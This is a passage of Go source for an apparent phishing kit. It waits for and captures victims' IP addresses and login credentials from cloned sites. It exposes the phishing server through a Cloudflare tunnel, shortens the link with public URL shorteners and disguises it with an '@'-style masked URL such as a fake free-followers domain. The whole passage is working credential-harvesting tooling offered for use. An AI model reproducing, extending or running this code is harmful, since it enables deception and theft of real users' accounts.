	fmt.Printf("\n%s[%s-%s]%s Waiting for Login Info, %sCtrl + C %sto exit...%s\n", Red, White, Red, Orange, Blue, Orange, White)

	exe, err := os.Executable()
	if err != nil {
		return err
	}
	baseDir := filepath.Dir(exe)
	ipFile := filepath.Join(baseDir, ".server", "www", "ip.txt")
	credFile := filepath.Join(baseDir, ".server", "www", "usernames.txt")

	for {
		if _, err := os.Stat(ipFile); err == nil {
			fmt.Printf("\n\n%s[%s-%s]%s Victim IP Found !%s\n", Red, White, Red, Green, White)
			if err := captureIp(); err != nil {
				fmt.Fprintf(os.Stderr, "Error capturing IP: %v\n", err)
			}
			os.Remove(ipFile)
		}
		time.Sleep(750 * time.Millisecond)

		if _, err := os.Stat(credFile); err == nil {
			fmt.Printf("\n\n%s[%s-%s]%s Login info Found !!%s\n", Red, White, Red, Green, White)
			if err := captureCreds(); err != nil {
				fmt.Fprintf(os.Stderr, "Error capturing credentials: %v\n", err)
			}
			os.Remove(credFile)
		}
		time.Sleep(750 * time.Millisecond)
	}
}

// Helper function to copy directories recursively
func copyDir(src, dst string) error {
	srcInfo, err := os.Stat(src)
	if err != nil {
		return err
	}
	if err := os.MkdirAll(dst, srcInfo.Mode()); err != nil {
		return err
	}

	entries, err := os.ReadDir(src)
	if err != nil {
		return err
	}

	for _, entry := range entries {
		srcPath := filepath.Join(src, entry.Name())
		dstPath := filepath.Join(dst, entry.Name())

		if entry.IsDir() {
			if err := copyDir(srcPath, dstPath); err != nil {
				return err
			}
		} else {
			data, err := os.ReadFile(srcPath)
			if err != nil {
				return err
			}
			if err := os.WriteFile(dstPath, data, 0644); err != nil {
				return err
			}
		}
	}
	return nil
}

// Custom Mask URL
func customMask(attack *Attack) error {
	time.Sleep(500 * time.Millisecond)
	fmt.Print("\033[H\033[2J")
	bannerSmall()
	fmt.Println()

	fmt.Printf("%s[%s?%s]%s Do you want to change Mask URL? %s[%sy%s/%sN%s] :%s ", Red, White, Red, Orange, Green, Cyan, Green, Cyan, Green, Orange)
	reader := bufio.NewReader(os.Stdin)
	maskOp, _ := reader.ReadString('\n')
	maskOp = strings.TrimSpace(maskOp)
	fmt.Println()

	if strings.ToLower(maskOp) == "y" {
		fmt.Printf("\n%s[%s-%s]%s Enter your custom URL below %s(%sExample: https://get-free-followers.com%s)\n\n", Red, White, Red, Green, Cyan, Orange, Cyan)
		fmt.Printf("%s ==> %s", White, Orange)
		maskUrl, _ := reader.ReadString('\n')
		maskUrl = strings.TrimSpace(maskUrl)
		if maskUrl == "" {
			maskUrl = "https://"
		}

		// Validate URL: starts with http://, https://, or www, and domain has allowed characters
		protocolRe := regexp.MustCompile(`^(https?://|www)`)
		domainRe := regexp.MustCompile(`^[^,~!@%:=\#;^\*"\'\|\?+<>\(\{\)\}\\/]+$`)
		parsedUrl, err := url.Parse(maskUrl)
		if err != nil {
			fmt.Printf("\n%s[%s!%s]%s Invalid url type..Using the Default one..%s\n", Red, White, Red, Orange, White)
			return nil
		}
		hasValidProtocol := protocolRe.MatchString(maskUrl) || parsedUrl.Scheme == "http" || parsedUrl.Scheme == "https"
		hasValidDomain := domainRe.MatchString(parsedUrl.Host) || (parsedUrl.Host == "" && domainRe.MatchString(maskUrl))
		if hasValidProtocol && hasValidDomain {
			attack.Mask = maskUrl
			fmt.Printf("\n%s[%s-%s]%s Using custom Masked Url :%s %s%s\n", Red, White, Red, Cyan, Green, maskUrl, White)
		} else {
			fmt.Printf("\n%s[%s!%s]%s Invalid url type..Using the Default one..%s\n", Red, White, Red, Orange, White)
		}
	}
	return nil
}

// Check site status
func siteStat(baseUrl string) (int, error) {
	client := &http.Client{
		Timeout: 5 * time.Second,
	}
	resp, err := client.Head(baseUrl + "https://github.com")
	if err != nil {
		return 0, err
	}
	defer resp.Body.Close()
	return resp.StatusCode, nil
}

// Shorten URL
func shorten(baseUrl, targetUrl string) (string, error) {
	client := &http.Client{
		Timeout: 5 * time.Second,
	}

	if strings.Contains(baseUrl, "is.gd") {
		resp, err := client.Get(baseUrl + url.QueryEscape(targetUrl))
		if err != nil {
			return "", fmt.Errorf("failed to shorten with is.gd: %v", err)
		}
		defer resp.Body.Close()
		data, err := io.ReadAll(resp.Body)
		if err != nil {
			return "", fmt.Errorf("failed to read is.gd response: %v", err)
		}
		return strings.TrimSpace(string(data)), nil
	} else if strings.Contains(baseUrl, "shrtco.de") {
		resp, err := client.Get(baseUrl + url.QueryEscape(targetUrl))
		if err != nil {
			return "", fmt.Errorf("failed to shorten with shrtco.de: %v", err)
		}
		defer resp.Body.Close()
		var result struct {
			Ok      bool   `json:"ok"`
			Result  struct {
				ShortLink2 string `json:"short_link2"`
			} `json:"result"`
		}
		if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
			return "", fmt.Errorf("failed to parse shrtco.de JSON: %v", err)
		}
		if !result.Ok {
			return "", fmt.Errorf("shrtco.de returned error")
		}
		return result.Result.ShortLink2, nil
	} else if strings.Contains(baseUrl, "tinyurl.com") {
		resp, err := client.Get(baseUrl + url.QueryEscape(targetUrl))
		if err != nil {
			return "", fmt.Errorf("failed to shorten with tinyurl.com: %v", err)
		}
		defer resp.Body.Close()
		data, err := io.ReadAll(resp.Body)
		if err != nil {
			return "", fmt.Errorf("failed to read tinyurl.com response: %v", err)
		}
		return strings.TrimSpace(string(data)), nil
	}
	return "", fmt.Errorf("unsupported shortening service")
}

// Custom URL
func customUrl(rawUrl string, attack Attack) error {
	// Strip protocol for processing
	urlStr := strings.TrimPrefix(strings.TrimPrefix(rawUrl, "http://"), "https://")
	isgd := "https://is.gd/create.php?format=simple&url="
	shortcode := "https://api.shrtco.de/v2/shorten?url="
	tinyurl := "https://tinyurl.com/api-create.php?url="

	// Update mask if user chooses
	if err := customMask(&attack); err != nil {
		return fmt.Errorf("error in customMask: %v", err)
	}
	time.Sleep(1 * time.Second)
	fmt.Print("\033[H\033[2J")
	bannerSmall()

	// Check if URL is a Cloudflared URL
	cloudflaredRe := regexp.MustCompile(`[-a-zA-Z0-9.]*(trycloudflare\.com)`)
	var processedUrl string
	if cloudflaredRe.MatchString(urlStr) {
		// Try shortening with available services
		if status, err := siteStat(isgd); err == nil && status/100 == 2 {
			if short, err := shorten(isgd, "https://"+urlStr); err == nil {
				processedUrl = short
			}
		} else if status, err := siteStat(shortcode); err == nil && status/100 == 2 {
			if short, err := shorten(shortcode, "https://"+urlStr); err == nil {
				processedUrl = short
			}
		} else if status, err := siteStat(tinyurl); err == nil && status/100 == 2 {
			if short, err := shorten(tinyurl, "https://"+urlStr); err == nil {
				processedUrl = short
			}
		}

		if processedUrl == "" {
			processedUrl = "Unable to Short URL"
		}
	} else {
		urlStr = "Unable to generate links. Try after turning on hotspot"
		processedUrl = "Unable to Short URL"
	}

	// Ensure URLs have https://
	fullUrl := "https://" + urlStr
	if !strings.HasPrefix(processedUrl, "http") && processedUrl != "Unable to Short URL" {
		processedUrl = "https://" + processedUrl
	}

	// Create masked URL
	var maskedUrl string
	if processedUrl != "Unable to Short URL" {
		maskedUrl = attack.Mask + "@" + strings.TrimPrefix(processedUrl, "https://")
	}

	// Print URLs
	fmt.Printf("\n%s[%s-%s]%s URL 1 : %s%s%s\n", Red, White, Red, Blue, Green, fullUrl, White)
	fmt.Printf("\n%s[%s-%s]%s URL 2 : %s%s%s\n", Red, White, Red, Blue, Orange, processedUrl, White)
	if maskedUrl != "" {
		fmt.Printf("\n%s[%s-%s]%s URL 3 : %s%s%s\n", Red, White, Red, Blue, Orange, maskedUrl, White)
	}
	return nil
}

// Start Cloudflared
func startCloudflared(attack Attack) error {
    exe, err := os.Executable()
    if err != nil {
        return err
    }
    baseDir := filepath.Dir(exe)
    cldLog := filepath.Join(baseDir, "cloudflared.log")
    cloudflaredPath := filepath.Join(baseDir, "cloudflared.exe")

    cmd := exec.Command(cloudflaredPath, "tunnel", "--url", fmt.Sprintf("http://%s:%d", HOST, PORT), "--logfile", cldLog)
    cmd.Stdout = os.Stdout
    cmd.Stderr = os.Stderr
    if err := cmd.Start(); err != nil {
        return fmt.Errorf("failed to start cloudflared: %v", err)
    }

    fmt.Printf("\n%s[%s-%s]%s Waiting for Tunnel...%s\n", Red, White, Red, Blue, White)
    time.Sleep(3 * time.Second)

    url, err := getURL(cldLog)
    if err != nil {
        return fmt.Errorf("failed to get tunnel URL: %v", err)
    }
    fmt.Printf("\n%s[%s-%s]%s URL : %s%s%s\n", Red, White, Red, Green, Blue, url, White)
    fmt.Printf("%s[%s-%s]%s Masked URL : %s%s%s\n", Red, White, Red, Green, Blue, attack.Mask, White)
    fmt.Printf("\n%s[%s!%s]%s Waiting for Victim Interaction...%s\n", Red, White, Red, Orange, White)

    if err := setupSite(attack.Website, attack.Service); err != nil {
        return fmt.Errorf("failed to setup site: %v", err)
    }
    captureData()
    return nil
}

func startLocalhost(attack Attack) error {
    fmt.Printf("\n%s[%s-%s]%s URL : %shttp://%s:%d%s\n", Red, White, Red, Green, Blue, HOST, PORT, White)
    fmt.Printf("%s[%s-%s]%s Masked URL : %s%s%s\n", Red, White, Red, Green, Blue, attack.Mask, White)
    fmt.Printf("\n%s[%s!%s]%s Waiting for Victim Interaction...%s\n", Red, White, Red, Orange, White)

    if err := setupSite(attack.Website, attack.Service); err != nil {
        return fmt.Errorf("failed to setup site: %v", err)
    }
    captureData()
    return nil
}

// Tunnel selection
func tunnelMenu(attack Attack) {
    fmt.Print("\033[H\033[2J")
    bannerSmall()
    fmt.Println()
    fmt.Printf(`
%s[%s01%s]%s Localhost
%s[%s02%s]%s Cloudflared

`,
        Red, White, Red, Orange,
        Red, White, Red, Orange)

    fmt.Printf("%s[%s-%s]%s Select an option : %s", Red, White, Red, Green, Blue)
    reader := bufio.NewReader(os.Stdin)
    reply, _ := reader.ReadString('\n')
    reply = strings.TrimSpace(reply)

    fmt.Print("\033[H\033[2J")
    bannerSmall() // Display banner again for port prompt
    fmt.Println()
    fmt.Printf("%s[%s*%s]%s Enter port [default=8080] : %s", Red, White, Red, Cyan, Blue)
    port, _ := reader.ReadString('\n')
    port = strings.TrimSpace(port)
    if port == "" {
        port = "8080"
    }
    portNum, err := strconv.Atoi(port)
    if err != nil || portNum < 1 || portNum > 65535 {
        fmt.Printf("\n%s[%s!%s]%s Invalid Port, Try Again...\n", Red, White, Red, Red)
        time.Sleep(1 * time.Second)
        tunnelMenu(attack)
        return
    }
    PORT = portNum

	// Custom URL prompt
    fmt.Print("\033[H\033[2J")
    bannerSmall()
    fmt.Println()
    fmt.Printf("%s[%s*%s]%s Enter custom URL mask [default=%s] : %s", Red, White, Red, Cyan, attack.Mask, Blue)
    customMask, _ := reader.ReadString('\n')
    customMask = strings.TrimSpace(customMask)
    if customMask != "" {
        attack.Mask = customMask // Override default mask
    }

    switch reply {
    case "1", "01":
        if err := startLocalhost(attack); err != nil {
            fmt.Fprintf(os.Stderr, "Error starting localhost: %v\n", err)
        }
    case "2", "02":
        if err := startCloudflared(attack); err != nil {
            fmt.Fprintf(os.Stderr, "Error starting cloudflared: %v\n", err)
        }
    default:
        fmt.Printf("\n%s[%s!%s]%s Invalid Option, Try Again...\n", Red, White, Red, Red)
        time.Sleep(1 * time.Second)
        tunnelMenu(attack)
    }
}

// getURL extracts the Cloudflared tunnel URL from the log file
func getURL(logFile string) (string, error) {
    // Wait briefly to ensure the log file is written
    time.Sleep(1 * time.Second)

    data, err := os.ReadFile(logFile)
    if err != nil {
        return "", fmt.Errorf("failed to read cloudflared log: %v", err)
    }

    lines := strings.Split(string(data), "\n")
    for _, line := range lines {
        // Look for the line containing the tunnel URL
        if strings.Contains(line, ".trycloudflare.com") {
            // Extract URL (usually after "url=" or in a similar format)
            parts := strings.Fields(line)
            for _, part := range parts {
                if strings.HasPrefix(part, "https://") && strings.Contains(part, ".trycloudflare.com") {
                    return strings.TrimSpace(part), nil
                }
            }
        }
    }
    return "", fmt.Errorf("tunnel URL not found in log file")
}

func main() {
	// Set up signal handling (equivalent to trap exit_on_signal_*)
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		sig := <-sigChan
		switch sig {
		case syscall.SIGINT:
			fmt.Fprintf(os.Stderr, "\n\n%s[%s!%s]%s Program Interrupted.%s", Red, White, Red, Red, ResetBG)
			resetColor()
			os.Exit(0)
		case syscall.SIGTERM:
			fmt.Fprintf(os.Stderr, "\n\n%s[%s!%s]%s Program Terminated.%s", Red, White, Red, Red, ResetBG)
			resetColor()
			os.Exit(0)
		}
	}()

	// Set up directories
	if err := setupDirectories(); err != nil {
		fmt.Fprintf(os.Stderr, "Error setting up directories: %v\n", err)
		os.Exit(1)
	}

	// Check dependencies
	if err := dependencies(); err != nil {
		fmt.Fprintf(os.Stderr, "Error checking dependencies: %v\n", err)
		os.Exit(1)
	}

	// Install cloudflared (optional, comment if needed)
	if err := installCloudflared(); err != nil {
		fmt.Fprintf(os.Stderr, "Error installing cloudflared: %v\n", err)
		os.Exit(1)
	}

	// Kill existing processes
	if err := killPID(); err != nil {
		fmt.Fprintf(os.Stderr, "Error killing processes: %v\n", err)
		os.Exit(1)
	}

	// Check internet status
	checkStatus()

	// Display banner
	banner()

	// Example: Download cloudflared (comment if needed)
	if err := download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe", "cloudflared.exe"); err != nil {
		fmt.Fprintf(os.Stderr, "Error downloading cloudflared: %v\n", err)
		os.Exit(1)
	}

	mainMenu()
}